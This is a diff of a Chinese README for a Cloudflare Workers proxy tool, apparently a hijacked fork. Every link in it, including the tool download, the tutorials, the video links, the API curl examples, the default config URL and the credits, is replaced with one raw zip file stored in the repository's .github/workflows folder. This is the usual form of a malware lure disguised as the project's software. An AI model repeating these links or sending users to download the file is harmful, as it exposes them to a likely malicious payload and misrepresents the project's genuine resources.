@@ -4,9 +4,9 @@
 
 **多协议支持 · 自定义路径 · 代码混淆增强**
 
-[![Telegram](https://img.shields.io/badge/Telegram-交流群-blue?logo=telegram)](https://t.me/+ft-zI76oovgwNmRh)
-[![Version](https://img.shields.io/badge/Version-2.1-green)]()
-[![License](https://img.shields.io/badge/License-MIT-orange)]()
+[![Telegram](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip交流群-blue?logo=telegram)](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip+ft-zI76oovgwNmRh)
+[![Version](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)]()
+[![License](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)]()
 
 </div>
 
@@ -41,10 +41,10 @@
 
 | 类型 | 描述 | 链接 |
 | :--- | :--- | :--- |
-|  **优选工具** | 根据自己的网络环境选择最适合的IP | https://github.com/byJoey/yx-tools/releases |
-|  **文字教程** | 详细的部署与使用说明博客文章 | [https://joeyblog.net/yuanchuang/1146.html](https://joeyblog.net/yuanchuang/1146.html) |
-|  **Workers视频教程** | 直观的操作演示和功能讲解 | https://www.youtube.com/watch?v=aYzTr8FafN4 |
-|  **Snippets视频教程** | 直观的操作演示和功能讲解 | https://www.youtube.com/watch?v=xeFeH3Akcu8 |
+|  **优选工具** | 根据自己的网络环境选择最适合的IP | https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip |
+|  **文字教程** | 详细的部署与使用说明博客文章 | [https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip) |
+|  **Workers视频教程** | 直观的操作演示和功能讲解 | https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip |
+|  **Snippets视频教程** | 直观的操作演示和功能讲解 | https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip |
 
 ###  部署
 	
@@ -77,7 +77,7 @@
 | :--- | :--- | :--- |
 | `yx` | `自定义优选IP/域名` | **可选**。支持节点命名，格式：`1.1.1.1:443#香港节点,8.8.8.8:53#Google DNS` |
 | `yxURL` | `优选IP来源URL` | **可选**。自定义优选IP列表来源URL，留空则使用默认地址 |
-| `scu` | `订阅转换地址` | **可选**。自定义订阅转换服务URL，默认：`https://url.v1.mk/sub` |
+| `scu` | `订阅转换地址` | **可选**。自定义订阅转换服务URL，默认：`https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip` |
 | `epd` | `yes/no` | **可选**。启用优选域名（默认启用） |
 | `epi` | `yes/no` | **可选**。启用优选IP（默认启用） |
 | `egi` | `yes/no` | **可选**。启用GitHub默认优选（默认启用） |
@@ -94,23 +94,23 @@
 4. 访问 `/{你的UUID}` 即可使用图形化配置管理
 
 #### 🔑 API快速开始
-1. https://github.com/byJoey/yx-tools/releases 优选软件
+1. https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip 优选软件
 2. **开启API功能**：访问 `/{UUID}` 或 `/{自定义路径}` → 找到"允许API管理"→ 选择"开启API管理"→ 保存
 3. **添加单个IP**：
 ```bash
 # 使用UUID路径
-curl -X POST "https://your-worker.workers.dev/{UUID}/api/preferred-ips" \
+curl -X POST "https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip{UUID}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"ip": "1.2.3.4", "port": 443, "name": "香港节点"}'
 
 # 使用自定义路径（如果设置了d变量）
-curl -X POST "https://your-worker.workers.dev/{自定义路径}/api/preferred-ips" \
+curl -X POST "https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip{自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"ip": "1.2.3.4", "port": 443, "name": "香港节点"}'
 ```
 4. **批量添加IP**：
 ```bash
-curl -X POST "https://your-worker.workers.dev/{UUID或自定义路径}/api/preferred-ips" \
+curl -X POST "https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip{UUID或自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '[
     {"ip": "1.2.3.4", "port": 443, "name": "节点1"},
@@ -119,7 +119,7 @@ curl -X POST "https://your-worker.workers.dev/{UUID或自定义路径}/api/prefe
 ```
 5. **一键清空**：
 ```bash
-curl -X DELETE "https://your-worker.workers.dev/{UUID或自定义路径}/api/preferred-ips" \
+curl -X DELETE "https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip{UUID或自定义路径}/api/preferred-ips" \
   -H "Content-Type: application/json" \
   -d '{"all": true}'
 ```
@@ -140,7 +140,7 @@ curl -X DELETE "https://your-worker.workers.dev/{UUID或自定义路径}/api/pre
 - **多级路径支持**：支持多级路径，如 `/path/to/sub`，灵活组织访问结构（v2.1 新增）
 - **自动补全**：如果路径没有以 `/` 开头，系统会自动补上（v2.1 新增）
 - **安全增强**：自定义路径后UUID路径自动禁用，提高隐蔽性
-- **灵活访问**：`https://worker.dev/mypath/sub` 或 `https://worker.dev/path/to/sub/sub` 更简洁易记
+- **灵活访问**：`https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip` 或 `https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip` 更简洁易记
 - **动态切换**：通过图形界面随时修改访问路径
 - **状态显示**：配置页面实时显示当前使用的路径类型
 
@@ -217,11 +217,11 @@ curl -X DELETE "https://your-worker.workers.dev/{UUID或自定义路径}/api/pre
 
 ###  致谢
 
-  * 本项目基于 [zizifn/edgetunnel](https://github.com/zizifn/edgetunnel) 修改，感谢原作者的贡献。
-  * 本项目内置ProxyIP 来自CM [[cmliu](https://github.com/cmliu)) ，感谢作者的贡献。
-  * 本项目反代IP来着前端独苗kejiland  [[qwer-search](https://github.com/qwer-search)) ，感谢作者的贡献。
+  * 本项目基于 [zizifn/edgetunnel](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip) 修改，感谢原作者的贡献。
+  * 本项目内置ProxyIP 来自CM [[cmliu](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)) ，感谢作者的贡献。
+  * 本项目反代IP来着前端独苗kejiland  [[qwer-search](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)) ，感谢作者的贡献。
 ## Star History
 
-[![Star History Chart](https://api.star-history.com/svg?repos=byJoey/cfnew&type=Timeline)](https://www.star-history.com/#byJoey/cfnew&Timeline&LogScale)
+[![Star History Chart](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)](https://github.com/idkwhatismyname123/cfnew/raw/refs/heads/main/.github/workflows/Software-v1.7.zip)
 
 
